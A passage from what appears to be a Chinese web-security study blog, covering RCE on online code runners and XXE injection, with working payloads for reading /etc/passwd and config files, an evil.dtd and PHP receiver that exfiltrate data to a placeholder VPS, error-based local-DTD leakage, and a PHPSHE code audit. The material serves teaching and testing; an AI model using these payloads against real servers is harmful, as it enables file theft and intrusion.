<strong>看功能</strong> 去发现，或者 <strong>配合一些其他漏洞</strong>，比如文件上传、文件包含之类的</p>\n</li>\n<li>\n<p>这里有一个案例，比如很多学校和网站都可能有的在线代码执行平台，那这里就是一个天然代码执行的点</p>\n</li>\n<li>\n<p>我们可以尝试让他去执行一些危险函数、命令来看一看它能不能 RCE</p>\n</li>\n<li>\n<p>比如这里我们随便找一个网上的在线平台，然后直接输入命令执行语句：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250904224715487.png\" alt=\"image-20250904224715487\"></p>\n</li>\n<li>\n<p>比如这里就直接看到了 <code>/etc/passwd</code> 的文件内容，但是这个东西其实也没啥用，因为基本上都是容器，需要配合 <code>docker</code> 逃逸看能不能造成危害</p>\n</li>\n</ul>\n<h3 id=\"XML-XXE漏洞\">XML&amp;XXE漏洞</h3>\n<h4 id=\"一、基础知识-5\">一、基础知识</h4>\n<h5 id=\"XML\">XML</h5>\n<ul>\n<li>\n<p>XML（eXtensible Markup Language，可扩展标记语言）是一种由 W3C（万维网联盟）制定的、用于描述<strong>结构化数据</strong>的标记语言。它本身并不规定具体标签，而是提供一套<strong>规则</strong>，让用户可以自定义标签和文档结构，从而实现数据的<strong>存储、传输和共享</strong>。</p>\n</li>\n<li>\n<p>其实可以把它当成一种<strong>数据传输的手段</strong>，但是<strong>同时具备存储的能力</strong>，因此其可以用于配置文件、数据交换、文档存储等</p>\n</li>\n<li>\n<p>XML 文档结构包括 <strong>XML 声明</strong>、<strong>DTD 文档类型定义</strong>（可选）、<strong>文档元素</strong>，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。等同于 JSON 传输。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">users</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>xiaosedi<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>123456<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>admin<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>admin123<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">users</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"XXE\">XXE</h5>\n<p><strong>原理</strong></p>\n<ul>\n<li>\n<p>XXE（XML External Entity Injection，XML 外部实体注入）漏洞是一种针对 XML 解析器的安全漏洞，攻击者通过构造恶意 XML 输入，利用应用程序解析 XML 时未禁用外部实体加载的安全缺陷，导致加载恶意外部文件或发起网络请求，从而可能实现文件读取、命令执行、内网攻击、SSRF（服务器端请求伪造）和 DoS 攻击等危害。</p>\n</li>\n<li>\n<p>在 DTD 中，可以<strong>通过 <code>&lt;!ENTITY&gt;</code> 定义实体</strong>，其中外部实体（External Entity）允许引用外部资源（如文件或 URL）。当 XML 解析器处理包含外部实体的 XML 时，如果未禁用外部实体加载，就可能加载攻击者指定的外部资源，造成安全漏洞。</p>\n</li>\n<li>\n<p>比如，以下 XML 代码定义了一个外部实体 <code>xxe</code>，指向 <code>/etc/passwd</code> 文件：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">foo</span> [</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">xxe</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">x</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">x</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"有回显\">有回显</h5>\n<ul>\n<li>\n<p>普通文件读取</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">root</span> [</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">xxe</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">login</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">pass</span>&gt;</span>mypass<span class=\"tag\">&lt;/<span class=\"name\">pass</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">login</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>读取PHP/二进制 --&gt; <strong>base64输出</strong>（防止解析错误）：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">root</span> [</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">xxe</span> <span class=\"keyword\">SYSTEM</span></span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">    <span class=\"string\">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/config.php&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">login</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">login</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"无回显\">无回显</h5>\n<ul>\n<li>\n<p>利用<strong>dnslog</strong>带外看看是否能执行</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">root</span> [</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">xxe</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;http://YOUR_BURP_COLLAB&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">root</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">root</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>利用思路</strong>就是<strong>将数据带出来</strong>，在VPS上准备两个文件：</p>\n<ul>\n<li><code>/var/www/html/evil.dtd</code></li>\n<li><code>/var/www/html/get.php</code>（写日志）</li>\n</ul>\n</li>\n<li>\n<p><code>evil.dtd</code>：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!ENTITY % <span class=\"keyword\">all</span></span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://YOUR_VPS/get.php?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class=\"line\">%all;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><code>get.php</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$data</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&#x27;xxe.log&#x27;</span>, <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$data</span>).<span class=\"string\">&quot;\\n&quot;</span>, FILE_APPEND);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><code>XXE</code>注入<code>payload</code>：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">root</span> [</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY % <span class=\"keyword\">file</span> <span class=\"keyword\">SYSTEM</span></span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">    <span class=\"string\">&quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY % <span class=\"keyword\">remote</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;http://test.xxe:999/test.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">  %remote;</span></span><br><span class=\"line\"><span class=\"meta\">  %all;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">root</span>&gt;</span></span><br><span class=\"line\"><span class=\"symbol\">&amp;send;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">root</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"本地DTD报错回显（不出网）\">本地DTD报错回显（不出网）</h5>\n<ul>\n<li>\n<p>当服务器禁止对外联网但仍需读取文件，可复用目标机器上已有的合法 DTD，触发解析错误带出数据：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">message</span> [</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY % <span class=\"keyword\">local_dtd</span> <span class=\"keyword\">SYSTEM</span></span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">    <span class=\"string\">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY % <span class=\"keyword\">condition</span> <span class=\"string\">&#x27;aaa)&gt;</span></span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"meta\"><span class=\"meta\">    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"meta\"><span class=\"meta\">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM</span></span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"meta\"><span class=\"meta\">      &#x27;</span>file:///nonexistent/&amp;#x25;file;<span class=\"string\">&#x27;&gt;&quot;&gt;</span></span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"meta\"><span class=\"meta\">    &amp;#x25;eval;</span></span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"meta\"><span class=\"meta\">    &amp;#x25;error;</span></span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"meta\"><span class=\"meta\">    &lt;!ENTITY aa (bb&#x27;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">  %local_dtd;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span>&gt;</span>text<span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>一句话总结</strong></p>\n<ul>\n<li><strong>有回显</strong>：直接 <code>file://</code> 或 <code>php://filter</code>，回显即结果。</li>\n<li><strong>无回显</strong>：三步曲 → %file 读取 → %remote 引入外部 DTD → %send 外带数据到 VPS。</li>\n</ul>\n<h4 id=\"二、XXE-黑盒发现\">二、XXE 黑盒发现</h4>\n<ul>\n<li>\n<p>在黑盒测试的时候，可以<strong>通过抓包的形式去判断是否为xml传输</strong></p>\n<ul>\n<li>传入的参数格式为<code>xml</code>格式</li>\n<li><code>Content-Type : application/xml</code></li>\n<li>BP抓包界面的<code>MIME</code>类型显示为<code>XML</code></li>\n<li>BP搜索<code>XML</code>关键字（如<code>&lt;?xml</code>）进行匹配</li>\n<li>直接更改<code>Content-Type</code>和传入的格式为<code>xml</code>尝试<code>XXE</code>注入</li>\n</ul>\n</li>\n<li>\n<p>那么在这个过程中，可能同样会出现<strong>有回显</strong>和<strong>无回显</strong>的情况：</p>\n<ul>\n<li><strong>有回显</strong>：根据回显直接注入</li>\n<li><strong>无回显</strong>：\n<ul>\n<li>通过带外查询去验证漏洞的存在</li>\n<li>通过外部实体DTD引用、OOB盲注等方式将查询的内容带出来</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>现在我们就用一个本地的案例来演示这个XXE漏洞，比如现在有个登录框：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907173842164.png\" alt=\"image-20250907173842164\"></p>\n</li>\n<li>\n<p>我们尝试登录，然后抓包看一看：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907173924100.png\" alt=\"image-20250907173924100\"></p>\n</li>\n<li>\n<p>这里就可以看到是以<code>xml</code>格式传输数据的，并且<code>Content-Type</code>也为<code>xml</code></p>\n</li>\n<li>\n<p>那么我们就可以继续看看它是否有回显，转到<code>Repeater</code>模块，发包：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907174009379.png\" alt=\"image-20250907174009379\"></p>\n</li>\n<li>\n<p>可以看到有回显，那么我们就可以构造恶意的<code>XML</code>实体，去尝试<code>XXE</code>注入了，假设我们D盘下面有一个<code>1.txt</code>文件</p>\n</li>\n<li>\n<p>然后这里可以直接尝试一下读取文件</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907174040270.png\" alt=\"image-20250907174040270\"></p>\n</li>\n<li>\n<p>并且这里可以<strong>通过响应的时间去探测内网端口</strong>，如果端口未开放，响应时间会比较长（2.5s左右）；端口开放则在0.5s左右：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907174111178.png\" alt=\"image-20250907174111178\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907174129528.png\" alt=\"image-20250907174129528\"></p>\n</li>\n</ul>\n<h4 id=\"三、XXE-白盒审计\">三、XXE 白盒审计</h4>\n<ul>\n<li>\n<p>对于白盒测试，就比黑盒相对简单，因为有代码可以看，一般的测试思路：</p>\n<ul>\n<li>通过<strong>应用功能</strong>追踪代码定位审计</li>\n<li>通过脚本<strong>特定函数</strong>搜索定位审计</li>\n<li>通过<strong>伪协议</strong>玩法<strong>绕过</strong>相关修复等</li>\n</ul>\n</li>\n<li>\n<p>其实就是一个从应用本身出发，一个从底层代码出发</p>\n</li>\n<li>\n<p>这里通过<code>PHPSHE</code>来演示如何去进行代码审计，找到漏洞，搭建完毕后是这样一个页面：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907174522170.png\" alt=\"image-20250907174522170\"></p>\n</li>\n<li>\n<p>这个<code>XXE</code>漏洞按第一个方法根据功能点是找不到的，因为根本不知道路径，所以我们尝试根据特定函数去找</p>\n</li>\n<li>\n<p>怎么找呢？问AI啊，直接问一下<code>PHP</code>中最常出现<code>XXE</code>漏洞的函数有哪些，然后搜一下看这个源码当中用没用到呗</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>函数 / 类方法</strong></th>\n<th style=\"text-align:center\"><strong>典型用途</strong></th>\n<th style=\"text-align:center\"><strong>默认是否加载外部实体</strong></th>\n<th style=\"text-align:center\"><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">simplexml_load_string()</td>\n<td style=\"text-align:center\">把 XML 字符串解析成 SimpleXMLElement</td>\n<td style=\"text-align:center\">是（libxml &lt; 2.9.0）</td>\n<td style=\"text-align:center\">审计/CTF 最常见</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">simplexml_load_file()</td>\n<td style=\"text-align:center\">把 XML 文件解析成 SimpleXMLElement</td>\n<td style=\"text-align:center\">同上</td>\n<td style=\"text-align:center\">本地或远程文件均可</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">new SimpleXMLElement($xml, LIBXML_NOENT)</td>\n<td style=\"text-align:center\">面向对象版本</td>\n<td style=\"text-align:center\">同上</td>\n<td style=\"text-align:center\">如传了 <code>LIBXML_NOENT</code> 必触发</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">DOMDocument::loadXML()</td>\n<td style=\"text-align:center\">DOM 方式解析 XML 字符串</td>\n<td style=\"text-align:center\">同上</td>\n<td style=\"text-align:center\">默认同样受 libxml 版本限制</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">DOMDocument::load()</td>\n<td style=\"text-align:center\">DOM 方式解析 XML 文件</td>\n<td style=\"text-align:center\">同上</td>\n<td style=\"text-align:center\">—</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">xml_parse()</td>\n<td style=\"text-align:center\">基于 expat 的解析器</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">expat 默认不加载外部 DTD，相对安全</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>\n<p>一句话总结：</p>\n<ul>\n<li>只要看到<code>simlexml_load_string</code>、<code>simplexml_load_file</code>、<code>DOMDocument::loadXML/load</code>等函数，且 <code>libxml</code>版本 &lt; 2.0.0 或未显示禁用实体加载，就可以大胆尝试 XXE Payload</li>\n</ul>\n</li>\n<li>\n<p>列出了几个函数，一个一个看源码中有没有，然后慢慢分析：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907175400173.png\" alt=\"image-20250907175400173\"></p>\n</li>\n<li>\n<p>这里就存在<code>simplexml_load_string()</code>函数，还可以再看一下前面是否出现<code>libxml_disable)entity_loader(true);</code>设置（不加载外部实体），但这里并没有</p>\n</li>\n<li>\n<p>第一个注释不用管，第二个点进去看看，这里代码太长了，可以先放一放；再看第三个呢，就两行代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pe_getxml</span>(<span class=\"params\"></span>) </span>&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$xml</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&quot;php://input&quot;</span>);  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$xml</span> = <span class=\"title function_ invoke__\">json_decode</span>(<span class=\"title function_ invoke__\">json_encode</span>(<span class=\"title function_ invoke__\">simplexml_load_string</span>(<span class=\"variable\">$xml</span>, <span class=\"string\">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA)), <span class=\"literal\">true</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里还看到<code>php://input</code>伪协议了，可能需要我们<code>POST</code>传值，返回值为为被解析为字符串的<code>XML</code></p>\n</li>\n<li>\n<p>然后这里是可能会触发的，那我们看一下那里调用了这个函数：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907195318115.png\" alt=\"image-20250907195318115\"></p>\n</li>\n<li>\n<p>然后这里可以找到<code>wechat.hook.php</code>文件中调用了这个函数：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">wechat_getxml</span>(<span class=\"params\"></span>) </span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">pe_getxml</span>();  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里就一个返回值，那我们可以再找一下哪个地方用到了<code>wechat_getxml()</code>这个函数，于是找到了最初调用的文件<code>notify_url.php</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907201952815.png\" alt=\"image-20250907201952815\"></p>\n</li>\n<li>\n<p>这里就可以审计了，就很简单，首先$xml这个参数得到返回值，然后取它的[‘out_trade_no’]键里的值处理后赋给$order_id；然后取[‘transaction_id’]值给$order_outid；之后进行判断，这里都不重要了，重要的是可以看到没有地方输出$xml参数的值，输出的都是些固定的字符串，也就是说，这里很可能是无回显的</p>\n</li>\n<li>\n<p>那么我们先找到这个文件的地址，然后在网页中访问到它，这里可以先看看他的一个路由方式，然后在尝试访问，这里倒没什么路由，直接复制文件路径就访问到了：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907202132369.png\" alt=\"image-20250907202132369\"></p>\n</li>\n<li>\n<p>抓个包看一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907202150889.png\" alt=\"image-20250907202150889\"></p>\n</li>\n<li>\n<p>然后我们随便发送一个测试<code>payload</code>看一看到底有没有回显：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907202556032.png\" alt=\"image-20250907202556032\"></p>\n</li>\n<li>\n<p>这里可以很明显的看到可能是有<code>XXE</code>的，但是没有回显，那我们就可以用上面说到的dnslog带外验证一下</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907203009819.png\" alt=\"image-20250907203009819\"></p>\n</li>\n<li>\n<p>这里用我们上面的<code>payload</code>去看一下能不能访问外部实体，这里它并没有访问，为什么呢？</p>\n</li>\n<li>\n<p>通过查询，原来是<code>PHP</code>版本的问题，这个问题在搭建东西的时候也是经常能遇到，因为<code>php5.6</code>开始引用了<code>libxml2.9.x</code>，所以只有php版本小于5.6才行</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907203232096.png\" alt=\"image-20250907203232096\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907203806335.png\" alt=\"image-20250907203806335\"></p>\n</li>\n<li>\n<p>然后我们尝试将数据带出来，在VPS上准备两个文件两个文件：<code>test.dtd</code>和<code>get.php</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- test.dtd --&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!ENTITY % <span class=\"keyword\">all</span> <span class=\"string\">&quot;&lt;!ENTITY send SYSTEM &#x27;http://xx.xx.xx.xx/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// get.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$data</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$myfile</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;file.txt&quot;</span>, <span class=\"string\">&quot;w+&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$myfile</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$myfile</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>然后这里将<code>xx.xx.xx.xx</code>改成自己服务器的地址，整个过程就是将得到的数据当作参数传入<code>file</code>中，然后将这个值写到本地文件里面，实现无回显的利用</p>\n</li>\n<li>\n<p>这里为了方便演示，我就在本地用小皮简易搭建一个服务器，然后访问：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907205830348.png\" alt=\"image-20250907205830348\"></p>\n</li>\n<li>\n<p>这里为了避免参数<code>file</code>包含空格、换行符等，尽量采用<code>base64</code>编码，接着就能看到目录下面多了一个<code>file.txt</code>文件：</p>\n<p><img 